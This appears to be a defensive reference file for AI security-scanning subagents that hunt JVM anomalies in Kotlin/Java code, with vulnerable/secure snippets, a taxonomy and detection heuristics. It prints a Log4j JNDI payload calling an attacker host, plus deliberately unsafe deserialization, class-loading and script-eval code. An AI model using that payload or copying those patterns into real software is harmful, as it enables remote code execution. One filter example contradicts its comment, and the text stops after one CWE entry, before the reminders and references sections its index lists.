---
subject: "JVM anomaly detection reference for Kotlin/Java SAST subagents; shared-protocol execution parameters, anomaly IS/IS-NOT definition with prevention patterns, vulnerable/secure examples incl. deserialization, Jackson polymorphism, JNDI, Log4j lookups with `2.17.1` guidance, `ClassLoader`s, Kotlin reflection, JNI, scripting, KSP, twelve-row taxonomy, per-category heuristics, `API5:2023`/`API8:2023`/`API10:2023` mapping, CWE list, operational reminders, references."
index:
  - anchor: jvm-anomalies-detection
    what: "Focused JVM anomaly detection role executed through the shared three-stage pipeline (`execution-protocol.md`) — recon for suspicious Kotlin/Java construction sites across twelve categories, batched verify separating exploitable anomalies from legitimate runtime usage, merge — gated on the architecture report."
    problem: "Kotlin/Java backend may execute attacker-controlled code through powerful runtime facilities rather than plain logic flaws, and unstructured hunting conflates dependency-injection reflection with hostile dynamic execution while burying reviewers in unverified candidates; detection orchestration, runtime sweep, trust judgment, candidate flood, coverage goal, methodical triage, hostile dynamism."
    use_when: "JVM anomaly scan selected by the screener; `{{ REPORTS_ROOT }}/01_architecture.md` exists; full three-stage detection must run."
    avoid_when: "Architecture report missing — run analysis first; only conceptual JVM-anomaly knowledge is needed, not execution."
    expected: "Confirmed exploitable-anomaly findings consolidated into one module report with benign patterns filtered out."
  - anchor: jvm-anomalies-what-is
    what: "JVM anomaly definition — any runtime facility processing attacker-controlled data without safe contract, sandbox, or allowlist — with IS list (unsafe deserialization, JNDI injection, custom ClassLoaders, JNI/native loading, Kotlin reflection abuse, KSP/compiler plugins, Log4j-style lookups, scripting engines, RMI/JMX exposure, instrumentation agents, MethodHandle/invokedynamic, Unsafe/off-heap), IS-NOT list (allowlisted serialization, hardcoded startup JNDI, classpath loading, DI reflection, lookups-disabled logging, fixed-path native libraries, trusted-schema KSP), and three prevention patterns incl. `ObjectInputFilter` allowlists, `log4j2.formatMsgNoLookups` with `2.17.1` upgrade guidance, hardcoded JNDI names."
    problem: "Reviewer cannot tell whether powerful runtime construct counts as exploitable anomaly without crisp trust boundaries, so DI-container reflection gets flagged while `${jndi:...}` lookups hiding inside logged headers slip past triage; definition scope, boundary rules, inclusion criteria, exclusion list, classification accuracy, trust framing, false-flag risk, dangerous-versus-routine test."
    use_when: "Deciding whether observed runtime construct belongs to the anomaly risk class; testing IS criteria against input controllability; confirming whether flagged pattern matches documented prevention mechanisms."
    avoid_when: "Generic code-injection sinks without JVM runtime specifics — route to `05-rce.md`; deliberate implant intent beyond facility abuse belongs to `21-backdoors.md`; generic configuration hardening belongs to `20-misconfiguration.md`; dependency version CVEs without facility context belong to `23-dependencies.md`."
    expected: "Suspicious constructs classified against IS/IS-NOT boundaries with explicit trust reasoning; prevented postures dismissed with documented rationale."
  - anchor: jvm-anomalies-vulnerable-vs-secure
    what: "Nine vulnerable/secure pairs — raw `ObjectInputStream.readObject` versus schema-bound DTO with `ObjectInputFilter`, global Jackson `enableDefaultTyping` versus closed `@JsonSubTypes` set, request-driven `InitialContext.lookup` versus hardcoded names, Log4j `${jndi:...}` header interpolation versus lookups disabled with `2.17.1` upgrade, network-byte `defineClass` versus signed module layers, `callBy` on user-named functions versus sealed-class dispatch, user-influenced `System.load` versus fixed vendor paths, `ScriptEngine.eval` on request data versus allowlisted expression evaluator, remote-schema KSP generation versus hash-pinned validated schemas."
    problem: "JVM attacks look different per facility, and generic suspicion rules miss whether polymorphic typing flags, dynamic lookup names, bytecode provenance, or reflection targets actually decide exploitability; facility recipes, hardened idioms, precise detection, pattern matching, stack quirks, payload signals, verdict support, exploit shape."
    use_when: "Verify stage applies the file's per-stack examples when judging candidates; target project runs Java or Kotlin; contrasting observed construction site against known-good counterpart."
    avoid_when: "Conceptual IS/IS-NOT boundaries are the question — see the definition card; category catalog needed — see the taxonomy card; plain injection-sink semantics belong to `05-rce.md`."
    expected: "Each suspicious site matched against its vulnerable pattern and secure counterpart; matching idioms cited in batch findings."
  - anchor: jvm-anomalies-taxonomy
    what: "Twelve-row category table — unsafe deserialization, JNDI injection, custom ClassLoaders, JNI/native loading, Kotlin reflection abuse, KSP/compiler plugins, Log4j-style lookups, scripting engines, RMI/JMX exposure, instrumentation/agents, MethodHandle/invokedynamic, Unsafe/off-heap access — each with description and typical signals incl. `enableDefaultTyping`, `${jndi:...}` strings, `defineClass`, `callBy`, `premain`, `LambdaMetafactory`."
    problem: "Recon output and findings need consistent category labels, yet improvised naming fragments reports and leaves instrumentation or off-heap channels without any bucket; category canon, labeling scheme, signal index, classification vocabulary, report consistency, bucket coverage, naming discipline."
    use_when: "Assigning canonical labels to recon sites or batch findings; checking which signals typify each anomaly class; scoping recon search lists across all twelve rows."
    avoid_when: "Per-category hunt procedure is the need — see the heuristics card; conceptual scope boundaries belong to the definition card."
    expected: "Every site and finding carries one canonical row label; no anomaly class left unnamed."
  - anchor: jvm-anomalies-detection-heuristics
    what: "Per-category hunt checklist: `ObjectInputStream`/`readObject` source tracing with `ObjectInputFilter` verification, Jackson default-typing and XStream/Kryo/SnakeYAML/Fastjson configuration review, lookup-name taint analysis across `InitialContext`/`DirContext` with LDAP/RMI/DNS protocol checks and Log4j version scrutiny, `defineClass` byte-array provenance with signing checks, `System.load` path-influence tracing, `callBy`/`KClass` target derivation review, `SymbolProcessor`/`AbstractProcessor` input auditing, `formatMsgNoLookups` and `%m{nolookups}` config verification, `ScriptEngine.eval` source tracing, RMI/JMX binding and authentication review, `premain`/`agentmain` provenance, `MethodHandles` descriptor taint, `sun.misc.Unsafe`/`VarHandle` address-derivation checks."
    problem: "Verifier knows anomaly categories yet lacks concrete per-category tells, so subtle signals like default-typing flags, dynamic lookup protocols, unsigned bytecode origins, or script-source provenance go unchecked during review; hunting rigor, signal checklist, review depth, per-class scrutiny, evidence pointers, inspection steps, overlooked markers, false-negative exposure."
    use_when: "Recon or verify subagent needs actionable search guidance for one anomaly class; inspecting serialization configs, logging setups, class-loading paths, or script sources; deciding which artifacts to check for taint or provenance."
    avoid_when: "Category catalog without procedure is the need — see the taxonomy card; pure implant-intent judgment belongs to `21-backdoors.md`; dependency CVE version scanning without facility context belongs to `23-dependencies.md`."
    expected: "Every category checked with its concrete tells; each signal class inspected before verdict."
  - anchor: jvm-anomalies-execution
    what: "Domain execution parameters for the shared three-stage protocol: recon catalog of suspicious JVM construction sites across twelve categories, per-candidate verify checklist, classification rubric, and the finding-field set with OWASP root-cause and CWE fields."
    problem: "JVM anomaly hunting without precise domain criteria lets recon miss dynamic-execution channels and verify apply generic checklists that overlook runtime-facility quirks; criteria ownership, domain parameters, search catalog, checklist precision, detection quality, class specifics."
    use_when: "Dispatching or executing any pipeline stage for this scan; reviewing whether recon and verify criteria cover current JVM anomaly vectors."
    avoid_when: "Stage mechanics — batching, gating, merging — belong to `execution-protocol.md`; conceptual scope boundaries belong to the definition card; concrete per-category tells belong to the heuristics card."
    expected: "Stage subagents apply exact JVM anomaly criteria without inheriting generic templates."
  - anchor: jvm-anomalies-owasp-mapping
    what: "Three-row OWASP root-cause mapping: `API5:2023` Broken Function Level Authorization for reflection, scripting, and dynamic dispatch reaching administrative functions without authorization checks; `API8:2023` Security Misconfiguration for unsafe deserialization, enabled lookups, exposed RMI/JMX, and unsigned ClassLoaders as hardening failures; `API10:2023` Unsafe Consumption of APIs for third-party data passed to deserialization, reflection, scripting, or JNDI sinks."
    problem: "Findings must carry root-cause risk labels, yet reviewers guess between authorization, misconfiguration, and unsafe-consumption framings or skip mapping entirely, weakening report credibility; taxonomy tagging, risk attribution, mapping choice, report compliance, framing consistency, required field, triple applicability."
    use_when: "Filling the `OWASP API 2023 root-cause risk` field on batch findings; deciding which of three risks apply to confirmed JVM anomalies."
    avoid_when: "CWE identifier selection is the need — see the CWE card; broad misconfiguration hardening without JVM runtime context belongs to `20-misconfiguration.md`; pure authorization-gap analysis belongs to `10-missingauth.md`."
    expected: "Each finding cites `API5:2023`, `API8:2023`, `API10:2023`, or a combination with one-line justification."
  - anchor: jvm-anomalies-cwe-references
    what: "CWE identifier list for JVM anomaly findings: `CWE-502` Deserialization of Untrusted Data and `CWE-913` Improper Control of Dynamically-Managed Code Resources as common parents, `CWE-74` Injection, `CWE-94` Code Injection, `CWE-843` Type Confusion, `CWE-400` Uncontrolled Resource Consumption, `CWE-665` Improper Initialization, `CWE-672`, `CWE-915`, `CWE-1108`."
    problem: "Findings require precise weakness identifiers, and vague or missing mappings strip reports of remediation routing and trend tracking across scans; weakness taxonomy, mapping precision, report metadata, identifier canon, trend analysis, citation discipline, scan comparability."
    use_when: "Selecting the most specific CWE for each batch finding; confirming `CWE-502`/`CWE-913` parentage when no narrower entry fits."
    avoid_when: "OWASP risk framing is the need — see the mapping card; external attack-technique context wanted — see the references card."
    expected: "Every finding maps to the narrowest applicable CWE with parentage noted."
  - anchor: jvm-anomalies-important-reminders
    what: "Closing operational reminders: high-signal-yet-over-reportable verdict restraint with input-controllability verification, dependency-version checks for known deserialization and JNDI CVEs incl. Log4j2 and Jackson, git-history review of suspicious insertions, read-only verification with benign marker tests, evidence preservation before remediation, read-only subagent discipline."
    problem: "Modules close with inconsistent final guidance, letting over-reported reflection noise, unexecuted version checks, or unpreserved evidence slip into reports and incident response; closing rules, quality floor, final reminders, uniform endings, wrap discipline, audit closure, judgment restraint."
    use_when: "Finalizing the module report; checking verdict confidence, version hygiene, and evidence handling before closing the scan."
    avoid_when: "Earlier phases are still open — finish those first; injection, implant, or generic-config routing belongs to `05-rce.md`, `21-backdoors.md`, or `20-misconfiguration.md` cards."
    expected: "Reports close with uniform final rules applied, evidence preserved, and no exploit payloads executed."
  - anchor: jvm-anomalies-references
    what: "External link list: OWASP `API5:2023`/`API8:2023`/`API10:2023` pages, OWASP Deserialization and Logging cheat sheets, `CWE-502`/`CWE-74`/`CWE-94`/`CWE-913` entries, JNDI injection and Log4j2 `CVE-2021-44228` post-mortems."
    problem: "Reports need authoritative follow-up sources beyond distilled file content when facility-internals detail, Log4j incident narratives, or canonical citation is required; further reading, external canon, deep dives, primary material, cited works, incident case studies, reference integrity."
    use_when: "Primary sources or extended material is needed; findings require links to advisories, CWE entries, or documented JVM exploit incidents."
    avoid_when: "Recipe or orchestration needs route elsewhere — this list is follow-up reading, not procedure."
    expected: "Reader reaches canonical external material for any topic this file condenses."
---

# JVM Anomaly Detection (Kotlin / Java)

[ref: #jvm-anomalies-detection]

You are performing a focused security assessment of Kotlin/Java codebases for **JVM-specific execution anomalies**. These are language- and runtime-level patterns that can lead to remote code execution, unauthorized behavior, or malicious code execution through mechanisms unique to the JVM ecosystem: unsafe deserialization, JNDI injection, custom `ClassLoader`s, JNI/native loading, reflection abuse, compiler plugins, logging expression lookups, scripting engines, RMI/JMX, `MethodHandle`/`invokedynamic`, and runtime instrumentation. This skill uses a three-stage pipeline with subagents: **recon** (find suspicious JVM construction sites), **batched verify** (determine whether each site is exploitable or legitimate, in parallel batches of 3), and **merge** (consolidate results).

**Prerequisites**: `{{ REPORTS_ROOT }}/01_architecture.md` must exist. Run the analysis skill first if it doesn't.

## What is a JVM anomaly
[ref: #jvm-anomalies-what-is]

A JVM anomaly is any use of a Java/Kotlin runtime facility in a way that allows an attacker to execute arbitrary code, load untrusted classes, bypass type safety, or exfiltrate data by exploiting features that are powerful and often invisible to higher-level static analysis. These patterns are especially dangerous in API backends because a single deserialized request, a logged header, or a reflected method call can become a full server compromise.

The core question: *does this JVM facility process attacker-controlled data without a safe contract, sandbox, or explicit allowlist?*

### What a JVM anomaly IS

- **Unsafe deserialization**: calling `ObjectInputStream.readObject()` on untrusted bytes, or enabling polymorphic type handling in JSON/XML/ YAML libraries without an explicit allowlist.
- **JNDI injection**: `InitialContext.lookup()` (or `DirContext.lookup()`) with attacker-controlled names, including through log messages, headers, or configuration values.
- **Custom ClassLoaders**: loading bytecode from network, file uploads, encrypted blobs, or user input without signature verification.
- **JNI / native library loading**: `System.loadLibrary()` or `Runtime.load()` with attacker-influenced paths, or exposing native attack surface.
- **Kotlin reflection abuse**: `callBy`, `memberFunctions`, `declaredMemberProperties`, or `KClass` lookups driven by user input.
- **KSP / compiler plugins**: annotation processors or Kotlin Symbol Processing plugins that generate code from untrusted schemas/inputs or alter security-critical classes.
- **Log4j-style lookups**: logging frameworks that evaluate `${...}` expressions in messages (JNDI, env, sysprops) without disabling lookup substitution.
- **Scripting engines**: `ScriptEngineManager`, `Nashorn` (removed from the JDK in Java 15 — legacy/standalone `nashorn-core` only), `GroovyShell`, `KotlinScript` executing user-supplied code.
- **RMI / JMX exposure**: exported MBeans, RMI registries, or JMX connectors reachable without authentication.
- **Instrumentation / agents**: `java.lang.instrument` agents or `Instrumentation` APIs that transform classes at runtime.
- **MethodHandle / invokedynamic**: dynamic call sites constructed from untrusted descriptors.
- **Unsafe / off-heap access**: `sun.misc.Unsafe` or `java.lang.foreign` / Panama used to bypass memory safety.

### What a JVM anomaly is NOT

Do not flag these as anomalies:

- **Normal serialization** with explicit type allowlists, schema-bound DTOs, or protobuf/Avro/Thrift generated classes.
- **Legitimate JNDI lookups** of hardcoded, internal resources (e.g., `java:comp/env/jdbc/MyDB`) during startup.
- **Standard class loading** from the application classpath or dependency jars.
- **Kotlin reflection** used for internal dependency injection or serialization frameworks that validate types against a schema.
- **Logging frameworks** with lookup substitution explicitly disabled or using structured logging without string interpolation.
- **Native libraries** shipped and loaded from a fixed, vendor-controlled path.
- **KSP plugins** that only generate code from trusted, version-controlled schemas.

### Patterns that prevent JVM anomalies

When you see these patterns, the code is likely **not vulnerable**:

**1. Allowlisted deserialization**
```java
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("!*");
in.setObjectInputFilter(filter);
// Only expected classes are allowed; filter rejects everything else by default.
```

**2. Disabled lookup substitution in logging**
```xml
<!-- Log4j2: disable message lookups to prevent ${jndi:...} evaluation -->
<!-- NOTE: partial mitigation valid for Log4j 2.10–2.15 only; message lookups were removed entirely in 2.16 (making this property obsolete) — the real fix is upgrading to 2.17.1+ (2.16 → CVE-2021-45105, 2.17.0 → CVE-2021-44832) -->
<Property name="log4j2.formatMsgNoLookups">true</Property>
```

**3. Hardcoded JNDI resource names**
```java
// Name is a constant, not derived from request data
DataSource ds = (DataSource) ctx.lookup("java:comp/env/jdbc/MyDB");
```

***

## Vulnerable vs Secure Examples
[ref: #jvm-anomalies-vulnerable-vs-secure]

### Unsafe Java deserialization

```java
// VULNERABLE: reads any serialized object from request body
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();

// SECURE: use a JSON DTO with a strict schema
MyRequestDto dto = objectMapper.readValue(body, MyRequestDto.class);
// Or use ObjectInputFilter with an explicit allowlist
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
ois.setObjectInputFilter(ObjectInputFilter.Config.createFilter("com.example.SafeClass;!*"));
```

### Jackson polymorphic deserialization

```java
// VULNERABLE: enables default typing globally
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping(); // or activateDefaultTyping without allowlist

// SECURE: use @JsonTypeInfo with a closed set of known subtypes
@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, property = "type")
@JsonSubTypes({
    @JsonSubTypes.Type(value = Circle.class, name = "circle"),
    @JsonSubTypes.Type(value = Square.class, name = "square")
})
public abstract class Shape { }
```

### JNDI lookup from user input

```java
// VULNERABLE: attacker controls the lookup name
String name = request.getParameter("name");
Context ctx = new InitialContext();
ctx.lookup(name);

// SECURE: hardcoded resource name or strict allowlist
Set<String> ALLOWED = Set.of("java:comp/env/jdbc/MyDB");
String name = request.getParameter("name");
if (!ALLOWED.contains(name)) throw new IllegalArgumentException();
ctx.lookup(name);
```

### Log4j-style lookup in a logged header

```java
// VULNERABLE: header value is interpolated by the logger
logger.info("User-Agent: {}", request.getHeader("User-Agent"));
// Payload: ${jndi:ldap://attacker.com/a}

// SECURE: disable lookups or sanitize input before logging
// Log4j2: set log4j2.formatMsgNoLookups=true (2.10–2.15 only; lookups removed in 2.16 — upgrade to 2.17.1+ instead)
logger.info("User-Agent: {}", sanitize(header));
```

### Custom ClassLoader loading network bytes

```java
// VULNERABLE: downloads bytecode and defines a class
byte[] bytes = httpClient.getBody(url);
Class<?> c = new ClassLoader() {
    public Class<?> define(byte[] b) { return defineClass(null, b, 0, b.length); }
}.define(bytes);

// SECURE: only load signed, allowlisted modules from a trusted repository
ModuleLayer layer = createLayerForSignedModule(digest, signature);
```

### Kotlin reflection callBy with user input

```kotlin
// VULNERABLE: arbitrary function name and arguments from request
val kClass = Class.forName(request.body.className).kotlin
val fn = kClass.functions.first { it.name == request.body.methodName }
fn.callBy(request.body.args)

// SECURE: dispatch through a closed enum or sealed class
val action = Action.valueOf(request.body.action) // strict parsing
when (action) { ... }
```

### JNI / native library loading

```java
// VULNERABLE: path influenced by user input or environment
String lib = System.getProperty("user.lib");
System.load(lib);

// SECURE: load only from a fixed, application-controlled location
System.loadLibrary("myverified"); // resolves via java.library.path under operator control
```

### Script engine executing user code

```java
// VULNERABLE: executes arbitrary script from request
ScriptEngine engine = new ScriptEngineManager().getEngineByName("nashorn");
engine.eval(request.getParameter("script"));

// SECURE: no script execution; use a domain-specific expression evaluator with an allowlist
Expression expr = safeEvaluator.parse(request.getParameter("expr"));
```

### KSP plugin processing untrusted schemas

```kotlin
// VULNERABLE: code generator reads remote/untrusted schema and emits sources
val schema = URL(request.body.schemaUrl).readText()
generateKotlinSources(schema) // could emit malicious or backdoored code

// SECURE: schema is version-controlled, hash-pinned, and validated against a JSON Schema
val schema = loadPinnedSchema("schemas/v1/order.json")
generateKotlinSources(schema)
```

***

## JVM Anomaly Taxonomy
[ref: #jvm-anomalies-taxonomy]

| Category | Description | Typical signals |
| --- | --- | --- |
| **Unsafe deserialization** | Parsing serialized Java objects or enabling polymorphic type handling without an allowlist. | `ObjectInputStream.readObject`, `readUnshared`, Jackson `enableDefaultTyping` / `activateDefaultTyping`, XStream `fromXML`, Kryo `readClassAndObject`, YAML `load`, unsafe JSON polymorphism. |
| **JNDI injection** | Looking up attacker-controlled names through JNDI, often via log messages, headers, or config. | `InitialContext.lookup`, `DirContext.search`, `ctx.lookup(name)` where `name` is dynamic, `${jndi:...}` strings. |
| **Custom ClassLoaders** | Defining classes from untrusted bytes, network, or encrypted payloads. | `defineClass`, `ClassLoader.defineClass`, `URLClassLoader` with constructed URLs, `ByteBuddy`/`ASM`/`Javassist` generating classes from dynamic input. |
| **JNI / native loading** | Loading native libraries from attacker-influenced paths. | `System.load`, `System.loadLibrary`, `Runtime.load`, `Runtime.loadLibrary`, `ProcessBuilder` compiling/loading native code. |
| **Kotlin reflection abuse** | Using Kotlin reflection APIs to invoke arbitrary members from user input. | `KClass.functions`, `KCallable.callBy`, `memberProperties`, `declaredMemberFunctions`, `Class.forName(...).kotlin`. |
| **KSP / compiler plugins** | Annotation processors or KSP plugins that generate or transform code from untrusted inputs. | `SymbolProcessor`, `AbstractProcessor`, `process(resolver)`, code generation driven by remote schemas or external files. |
| **Log4j-style lookups** | Logging frameworks that evaluate `${...}` lookups in messages. | `${jndi:...}`, `${env:...}`, `${sys:...}` in log messages; message lookups enabled on Log4j 2.10–2.15, or any Log4j2 version below 2.17.1 in use; `%msg{lookups}` patterns. |
| **Scripting engines** | Executing scripts (JS, Groovy, Kotlin script) from request or config data. | `ScriptEngine.eval`, `GroovyShell.parse`, `KotlinScriptEngine`, `Nashorn`, `javax.script`. |
| **RMI / JMX exposure** | Remote method invocation or JMX connectors exposed without strong auth. | `LocateRegistry.createRegistry`, `JMXConnectorServer`, `MBeanServer.registerMBean`, RMI stub classes. |
| **Instrumentation / agents** | Runtime class transformation or agent loading. | `java.lang.instrument`, `Instrumentation.retransformClasses`, premain/agentmain, attach API. |
| **MethodHandle / invokedynamic** | Dynamic call sites built from untrusted descriptors. | `MethodHandles.lookup`, `MethodHandle.invoke`, `LambdaMetafactory`, `CallSite` construction from user data. |
| **Unsafe / off-heap access** | Use of `sun.misc.Unsafe`, `VarHandle`, or foreign-function API to bypass safety. | `Unsafe.getUnsafe`, `allocateMemory`, `putInt`, `VarHandle` on arbitrary memory, `MemorySegment` from untrusted addresses. |

***

## Detection heuristics per category
[ref: #jvm-anomalies-detection-heuristics]

### Unsafe deserialization

- Search for `ObjectInputStream` and `readObject`/`readUnshared` calls. Check whether the stream source is attacker-controllable.
- Look for Jackson `enableDefaultTyping`, `activateDefaultTyping`, `@JsonTypeInfo(use = Id.CLASS/MINIMAL_CLASS)`, or `ObjectMapper` configurations that allow class-name-based polymorphism.
- Check XStream, Kryo, SnakeYAML, Fastjson, Gson, JSON-B, JAXB configurations for unsafe type handling.
- Look for RMI/JRMP, JMX over RMI, or HTTP invoker endpoints that deserialize objects.
- Verify whether `ObjectInputFilter` (JDK 9+) or a class allowlist is applied.

### JNDI injection

- Search for `InitialContext.lookup`, `DirContext.lookup`, `EventContext.lookup`, `NamingManager.getObjectInstance`.
- Check whether the lookup name is built from request parameters, headers, log data, or configuration files writable by users.
- Look for log messages that include attacker-controlled values without disabling lookups (`log4j2.formatMsgNoLookups`, `%m{nolookups}`).
- Check LDAP, RMI, DNS, and IIOP protocols in lookup names; these are classic JNDI/RCE vectors.
- Examine dependency versions of Log4j, Logback, JBoss Logging, and other frameworks for known JNDI CVEs.

### Custom ClassLoaders

- Search for `defineClass`, `URLClassLoader`, `ClassLoader.defineClass`, `MethodHandles.Lookup.defineClass`.
- Check whether byte arrays passed to `defineClass` come from the network, file uploads, decryption, or reflection.
- Look for bytecode generation libraries (`ByteBuddy`, `ASM`, `Javassist`, `cglib`) driven by request data.
- Verify whether loaded classes are signed, checksum-verified, or bound to an allowlist.

### JNI / native loading

- Search for `System.load`, `System.loadLibrary`, `Runtime.load`, `Runtime.loadLibrary`.
- Check whether the library path is influenced by system properties, environment variables, or request data.
- Look for JNI method declarations (`native`) and `ProcessBuilder`/`gcc`/`clang` usage that compiles native code on the fly.
- Verify that `java.library.path` is restricted and libraries are shipped with the application.

### Kotlin reflection abuse

- Search for `Class.forName(...).kotlin`, `KClass`, `KCallable.callBy`, `KFunction.call`, `memberFunctions`, `declaredMemberFunctions`, `memberProperties`.
- Check whether reflection targets are derived from request data (class name, method name, property name).
- Look for `callBy` with a map of arguments built from JSON/XML input.
- Verify that reflection is constrained to a sealed set of known classes/methods.

### KSP / compiler plugins

- Identify annotation processors (`AbstractProcessor`) or KSP `SymbolProcessor` implementations.
- Check what inputs drive code generation: remote schemas, annotation attributes, external files, environment variables.
- Look for generated code that contains network calls, reflection, native loading, or dynamic dispatch.
- Verify that generated code is checked into version control or reproducibly built from pinned inputs.

### Log4j-style lookups

- Identify logging framework and version (Log4j2, Logback, JUL, JBoss Logging, SLF4J bridges).
- Check configuration for `formatMsgNoLookups=true` (relevant only on 2.10–2.15; on any version below 2.17.1 flag the version itself as the finding), `%m{nolookups}`, or equivalent settings.
- Search for log statements that interpolate user-controlled values directly into the message: `logger.info("..." + userInput)`.
- Look for custom appenders, layouts, or converters that evaluate expressions.

### Scripting engines

- Search for `ScriptEngineManager`, `ScriptEngine.eval`, `GroovyShell`, `KotlinScriptEngine`, `NashornScriptEngine`. Note: Nashorn is absent from JDK 15+ (standalone `nashorn-core` or GraalVM JS in modern stacks) but remains a detection target on legacy JVMs.
- Check whether the script source is request data, config, or an untrusted file.
- Look for sandboxes, SecurityManagers (deprecated), or allowlisted bindings.
- Verify that script execution is necessary and cannot be replaced with a safer expression evaluator.

### RMI / JMX exposure

- Search for `LocateRegistry.createRegistry`, `UnicastRemoteObject`, `JMXConnectorServerFactory`, `MBeanServer.registerMBean`.
- Check whether RMI/JMX ports are bound to all interfaces or accessible from the network.
- Look for authentication requirements (`JMXAuthenticator`, SSL, password files).
- Verify that JMX/RMI is not exposed in production or is protected by network policy.

### Instrumentation / agents

- Search for `java.lang.instrument`, `Instrumentation`, `premain`, `agentmain`, `VirtualMachine.attach`.
- Check whether agents are loaded dynamically from paths controlled by users or environment variables.
- Look for `retransformClasses` or `redefineClasses` that modify security-sensitive classes at runtime.
- Verify that agents are signed, allowlisted, and loaded from a trusted directory.

### MethodHandle / invokedynamic

- Search for `MethodHandles.lookup`, `MethodHandle.invoke`, `LambdaMetafactory`, `CallSite`, `MutableCallSite`.
- Check whether method descriptors, class names, or target objects come from request data.
- Look for dynamic proxies (`Proxy.newProxyInstance`) with handler logic driven by user input.

### Unsafe / off-heap access

- Search for `sun.misc.Unsafe`, `jdk.internal.misc.Unsafe`, `VarHandle`, `MemorySegment`, `Arena`, `FunctionDescriptor`.
- Check whether addresses, sizes, or layouts are derived from user input.
- Look for foreign-function calls (`Linker.downcallHandle`) to native libraries from dynamic paths.

***

## Execution
[ref: #jvm-anomalies-execution]

This scan runs via the shared three-stage pipeline in `references/execution-protocol.md` (recon+split → per-batch verify → merge, core-dispatched). The domain parameters below plug into its stage contracts. Final artifact: `{{ REPORTS_ROOT }}/24_jvm_anomalies.md`; classification family: standard (`[VULNERABLE]` / `[LIKELY VULNERABLE]`).

### Recon catalog

Search for these suspicious JVM construction sites:

1. **Unsafe deserialization**:
   - Java: `ObjectInputStream.readObject`, `readUnshared`, RMI/JRMP, JMX over RMI, HTTP invoker.
   - Jackson: `enableDefaultTyping`, `activateDefaultTyping`, `@JsonTypeInfo(use = Id.CLASS/MINIMAL_CLASS)`.
   - Other: XStream `fromXML`, Kryo `readClassAndObject`, SnakeYAML `load`, Fastjson parse with `AutoType`.

2. **JNDI injection**:
   - `InitialContext.lookup`, `DirContext.lookup`, `NamingManager.getObjectInstance` with dynamic names.
   - Log messages that interpolate attacker-controlled values (`${jndi:...}`, `${env:...}`, `${sys:...}`).

3. **Custom ClassLoaders**:
   - `defineClass`, `URLClassLoader`, `MethodHandles.Lookup.defineClass`.
   - Bytecode generation: ByteBuddy, ASM, Javassist, cglib driven by dynamic input.

4. **JNI / native loading**:
   - `System.load`, `System.loadLibrary`, `Runtime.load`, `Runtime.loadLibrary`.
   - Native method declarations and on-the-fly native compilation.

5. **Kotlin reflection abuse**:
   - `Class.forName(...).kotlin`, `KClass.functions`, `KCallable.callBy`, `memberProperties`.

6. **KSP / compiler plugins**:
   - `SymbolProcessor`, `AbstractProcessor`, code generation from remote schemas or external files.

7. **Log4j-style lookups**:
   - Log4j2/Logback/JUL configurations; `formatMsgNoLookups` (partial mitigation valid for Log4j 2.10–2.15 only; message lookups were removed entirely in 2.16 — the real fix is upgrading to 2.17.1+); `%m{nolookups}`; custom layouts.

8. **Scripting engines**:
   - `ScriptEngine.eval`, `GroovyShell`, `KotlinScriptEngine`, Nashorn (removed from the JDK in Java 15 — legacy/standalone `nashorn-core` or GraalVM JS in modern stacks, but still a detection target on legacy JVMs).

9. **RMI / JMX exposure**:
   - `LocateRegistry.createRegistry`, `JMXConnectorServer`, `MBeanServer.registerMBean`.

10. **Instrumentation / agents**:
    - `java.lang.instrument`, `premain`, `agentmain`, `VirtualMachine.attach`.

11. **MethodHandle / invokedynamic**:
    - `MethodHandles.lookup`, `LambdaMetafactory`, `CallSite` from user data.

12. **Unsafe / off-heap access**:
    - `sun.misc.Unsafe`, `VarHandle`, `MemorySegment`, `Arena`, foreign-function calls.

**Recon exclusions** — do not report:

- Schema-bound JSON/XML deserialization to known DTOs.
- Hardcoded JNDI names for internal resources during startup.
- Standard classpath loading.
- Signed/allowlisted plugin systems.
- DI frameworks (Spring, Koin) using reflection on known types.

### Verify checklist

For each candidate, check:

1. **Is the input attacker-controllable?**
   - Does data flow from an HTTP request, header, query parameter, body, file upload, config file, log message, or third-party response into the JVM facility?
   - Is there a trust boundary crossed without validation?
2. **Is the facility inherently dangerous?**
   - Does it allow arbitrary code execution, class loading, native execution, or reflection on attacker-chosen targets?
   - Is there an allowlist, sandbox, or ObjectInputFilter that limits behavior?
3. **Is the configuration unsafe?**
   - Is default typing enabled? Are lookups enabled in logging? Is JNDI/RMI exposed without auth?
   - Are dependencies known to be vulnerable (Log4j2 < 2.17, Fastjson, etc.)?
4. **What is the blast radius?**
   - Can the vulnerability be triggered by an unauthenticated request?
   - Does it lead to RCE, data exfiltration, SSRF, or lateral movement?

### Classification

- **[VULNERABLE]**: Confirmed unsafe use of a JVM facility with attacker-controllable input and no effective mitigation.
- **[LIKELY VULNERABLE]**: Strong indicators of unsafe use but some uncertainty about reachability or input control.
- **[SUSPICIOUS BUT LEGITIMATE]**: Unusual pattern but has a plausible product purpose (e.g., internal plugin system, signed agents, hardcoded JNDI names).
- **[NEEDS MANUAL REVIEW]**: Cannot determine exploitability from code alone; requires runtime testing or maintainer interview.

### Finding fields

Every finding block carries: classification tag, file/lines, endpoint or function, OWASP API 2023 root-cause risk (choose API5:2023 Broken Function Level Authorization, API8:2023 Security Misconfiguration, API10:2023 Unsafe Consumption of APIs, and/or the relevant injection risk, and explain why), CWE (the most specific identifier from the CWE references below, e.g., CWE-502, CWE-74, CWE-94, CWE-843, CWE-400, CWE-665), issue, taint trace / trigger (how attacker input reaches the JVM facility), impact, evidence (code snippet), remediation, and verification steps (a safe, read-only check to confirm the behavior — e.g., inspect dependency versions, review ObjectInputFilter config, test lookup substitution with a benign marker).

***

## OWASP API Security Top 10 2023 mapping
[ref: #jvm-anomalies-owasp-mapping]

| OWASP Risk | Why JVM Anomalies Matter |
|---|---|
| **API5:2023 Broken Function Level Authorization** | Reflection, scripting, and dynamic dispatch can be abused to call administrative or internal functions without proper authorization checks. |
| **API8:2023 Security Misconfiguration** | Unsafe deserialization, enabled JNDI/lookup substitution, exposed RMI/JMX, and unsigned ClassLoaders are hardening failures that expose the JVM runtime. |
| **API10:2023 Unsafe Consumption of APIs** | Third-party data passed to deserialization, reflection, scripting, or JNDI sinks can compromise the server through a trusted-looking integration. |

***

## CWE references
[ref: #jvm-anomalies-cwe-references]

- CWE-502: Deserialization of Untrusted Data
